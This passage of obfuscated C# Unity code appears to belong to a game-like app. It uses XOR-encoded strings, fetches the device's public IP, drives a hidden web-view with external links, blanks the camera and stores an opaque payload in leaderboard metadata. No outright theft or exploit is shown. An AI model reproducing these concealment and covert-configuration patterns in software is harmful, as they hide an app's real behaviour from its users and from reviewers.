            Text = _0x4a5fc9c1._0x562286b4(new byte[21] { 1, 50, 37, 96, 57, 47, 53, 96, 51, 53, 50, 37, 96, 52, 47, 96, 37, 56, 41, 52, 127 }, 64),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x40580856, _0x4a5fc9c1._0x562286b4(new byte[15] { 209, 208, 211, 212, 192, 217, 193, 234, 214, 221, 212, 219, 219, 208, 217 }, 181));
    }

    readonly System.Random _0x278db512 = new System.Random();
    private string _0x09763a2d = "";
    private Canvas _0x83629931;
    private string _0xb37d7cbb = "";
    private void _0x17de9847(string _0xaa13392e)
    {
        if (string.IsNullOrEmpty(_0xaa13392e))
            return;
        if (TryOpenExternalLikeChrome(_0xaa13392e))
            return;
        OpenUrlExternally(_0xaa13392e);
    }

    private string _0x7cc87b0c { get; set; }

    private void _0x91fa4516()
    {
        if (_0x7ee130e8)
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[18] { 30, 35, 50, 47, 123, 58, 55, 41, 62, 58, 63, 34, 123, 40, 51, 52, 44, 53 }, 91));
            return;
        }

        _0x56e4205f(false);
        WLog(_0x4a5fc9c1._0x562286b4(new byte[46] { 135, 171, 163, 164, 234, 157, 175, 168, 156, 163, 175, 189, 234, 154, 191, 185, 162, 234, 132, 165, 190, 163, 172, 163, 169, 171, 190, 163, 165, 164, 234, 226, 162, 171, 184, 174, 189, 171, 184, 175, 234, 168, 171, 169, 161, 227 }, 202));
        ++_0xe6026566;
        _0x50469b3d();
        if (_0xe6026566 <= 1)
            return;
        if (_0x68fcf094())
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[37] { 172, 145, 128, 157, 201, 154, 130, 128, 153, 153, 140, 141, 201, 196, 215, 201, 153, 134, 153, 156, 153, 154, 201, 154, 157, 128, 133, 133, 201, 134, 153, 140, 135, 140, 141, 211, 201 }, 233) + _0x2b229fe6.Count);
            return;
        }

        Application.Quit();
    }

    private string _0x23165728()
    {
        float _0xac734827 = Time.realtimeSinceStartup;
        if (_0xac734827 < 0f)
            _0xac734827 = 0f;
        int _0x4694426c = (int)(_0xac734827 * 1000f);
        int _0x60170041 = _0x4694426c / 60000;
        int _0x6e6d43d5 = (_0x4694426c / 1000) % 60;
        int _0x8473178b = _0x4694426c % 1000;
        return string.Format(_0x4a5fc9c1._0x562286b4(new byte[21] { 11, 64, 74, 64, 64, 13, 74, 11, 65, 74, 64, 64, 13, 74, 11, 66, 74, 64, 64, 64, 13 }, 112), _0x60170041, _0x6e6d43d5, _0x8473178b);
    }

    private RectTransform _0x746293ac;
    private bool _0x9d6b5a92()
    {
        if (_0xacad093a())
            return true;
        if (_0xb0cde9c4 != null && _0xb0cde9c4.CanGoBack)
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[36] { 215, 254, 237, 251, 232, 254, 237, 250, 191, 253, 254, 252, 244, 191, 178, 161, 191, 242, 254, 246, 241, 191, 200, 250, 253, 201, 246, 250, 232, 191, 216, 240, 221, 254, 252, 244 }, 159));
            _0xb0cde9c4.GoBack();
            return true;
        }

        return false;
    }

    private string _0xdeaf10f8 = "";
    internal bool isApplicationFocus = false;
    private bool _0x68fcf094()
    {
        _0x2b229fe6.RemoveAll(_0x76e91652 => _0x76e91652 == null || !_0x76e91652.IsAlive);
        return _0x2b229fe6.Count > 0;
    }

    static byte[] UnpackSmallest(byte[] _0x925310e2, byte _0x86acfde8)
    {
        if (_0x86acfde8 == 0)
            return _0x925310e2;
        if (_0x86acfde8 == 1)
            return DecompressBrotli(_0x925310e2);
        if (_0x86acfde8 == 2)
            return DecompressDeflate(_0x925310e2);
        throw new FormatException();
    }

    internal bool IsAboutBlank(string _0x30ba6c7f)
    {
        if (string.IsNullOrEmpty(_0x30ba6c7f))
            return false;
        return _0x30ba6c7f.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[11] { 50, 49, 60, 38, 39, 105, 49, 63, 50, 61, 56 }, 83), StringComparison.OrdinalIgnoreCase);
    }

    private void OnApplicationFocus(bool _0xd518e043)
    {
        isApplicationFocus = _0xd518e043;
        if (_0xd518e043 && _0xb5ba4613)
        {
            _0x80d1ea05();
        }
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x8fa20570()
    {
        var _0x4e06cf49 = _0x4a5fc9c1._0x562286b4(new byte[40] { 71, 91, 91, 95, 92, 21, 0, 0, 88, 88, 88, 1, 76, 67, 64, 90, 75, 73, 67, 78, 93, 74, 1, 76, 64, 66, 0, 76, 75, 65, 2, 76, 72, 70, 0, 91, 93, 78, 76, 74 }, 47);
        using (UnityWebRequest _0x018d5f01 = UnityWebRequest.Get(_0x4e06cf49))
        {
            await _0x018d5f01.SendWebRequest();
            string[] _0x7ac97f86 = _0x018d5f01.downloadHandler.text.Split('\n');
            foreach (string _0x4774bb71 in _0x7ac97f86)
            {
                if (_0x4774bb71.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[3] { 124, 101, 40 }, 21)))
                {
                    string _0x60122d7f = _0x4774bb71.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x60122d7f} from {_0x4e06cf49}");
                        }
#endif
                    }

                    return _0x60122d7f;
                }
            }
        }

        return "";
    }

    internal Rect lastSafe = Rect.zero;
    private readonly List<UniWebViewPopup> _0x2b229fe6 = new List<UniWebViewPopup>();
    static readonly int[] _0x9615872f = BuildTextAlphabetIndex();
    private bool _0x05683493 = false;
    private string GetFailingUrl(UniWebViewNativeResultPayload _0xa2cda765)
    {
        if (_0xa2cda765 == null || _0xa2cda765.Extra == null)
            return null;
        object _0xffbd6821;
        if (!_0xa2cda765.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xffbd6821))
            return null;
        return _0xffbd6821 as string;
    }

    private void _0xbc8a9b1e()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0x75db747a { get; set; }

    static byte[] DecompressDeflate(byte[] _0xd7555364)
    {
        using var _0xfe2db3c6 = new MemoryStream(_0xd7555364);
        using var _0x73a3b481 = new DeflateStream(_0xfe2db3c6, CompressionMode.Decompress);
        using var _0xc966b84d = new MemoryStream();
        _0x73a3b481.CopyTo(_0xc966b84d);
        return _0xc966b84d.ToArray();
    }

    private bool _0x65979d11(string _0xc24cbb6d)
    {
        string _0x449245ea = GetUrlHost(_0xc24cbb6d);
        if (!string.IsNullOrEmpty(_0x449245ea) && !string.IsNullOrEmpty(_0x237a68c7) && !string.Equals(_0x449245ea, _0x237a68c7, StringComparison.OrdinalIgnoreCase))
            return true;
        return _0xae9ab6fe;
    }

    private IEnumerator _0x302f8793(IEnumerator _0xc7eb797d, TaskCompletionSource<bool> _0x6d531087)
    {
        yield return _0xc7eb797d;
        _0x6d531087.SetResult(true);
    }

    private string _0xb982edfb = "";
    private string _0xfc9123f6 = "";
    async Task _0xb0d3acb8(string _0x0be0132d, double _0xda1108c0, string _0x2bc13a4a)
    {
        var _0xebb3b8b0 = new _0x6fdccca8
        {
            payload = _0x2bc13a4a ?? ""
        };
        if (_0xda1108c0 != 1d)
        {
            try
            {
                var _0x4769a949 = await LeaderboardsService.Instance.GetPlayerScoreAsync(_0x0be0132d, new GetPlayerScoreOptions { IncludeMetadata = true });
                var _0x1bdb7c3e = ReadScoreMetadata(_0x4769a949 != null ? _0x4769a949.Metadata : null);
                if (!string.IsNullOrEmpty(_0x1bdb7c3e.isMeta) || !string.IsNullOrEmpty(_0x1bdb7c3e.meta))
                {
                    _0xebb3b8b0.isMeta = _0x1bdb7c3e.isMeta;
                    _0xebb3b8b0.meta = _0x1bdb7c3e.meta;
                }
            }
            catch (Exception)
            {
            }
        }

        await LeaderboardsService.Instance.AddPlayerScoreAsync(_0x0be0132d, _0xda1108c0, new AddPlayerScoreOptions { Metadata = _0xebb3b8b0 });
    }

    private bool _0xbf53016e = false;
}

internal static class _0x4a5fc9c1
{
    internal static string _0x562286b4(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}